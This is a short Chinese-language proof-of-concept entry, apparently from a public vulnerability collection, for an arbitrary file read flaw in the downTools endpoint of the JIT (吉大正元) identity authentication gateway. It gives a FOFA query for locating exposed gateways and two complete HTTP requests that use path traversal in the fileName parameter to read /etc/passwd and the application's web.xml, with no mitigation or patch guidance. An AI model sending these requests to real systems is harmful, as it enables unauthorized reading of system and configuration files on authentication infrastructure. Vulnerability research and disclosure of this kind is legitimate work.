# 吉大正元身份认证网关downtools存在任意文件读取漏洞

# 一、漏洞简介
 吉大正元身份认证网关是提供内部网络的接入控制以及对接入用户进行强身份认证和审计服务的产品，解决用户使用应用系统时涉及的身份验证、信息保密、权限控制等安全问题。吉大正元身份认证网关downtools存在任意文件读取漏洞。

# 二、影响版本
+ 吉大正元身份认证网关

# 三、资产测绘
+ fofa`title="吉大正元身份认证网关"`
+ 特征


# 四 、漏洞复现
```java
GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```


```java
GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../home/gateway/src/main/webapp/WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ercgu609qmwqlr09>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
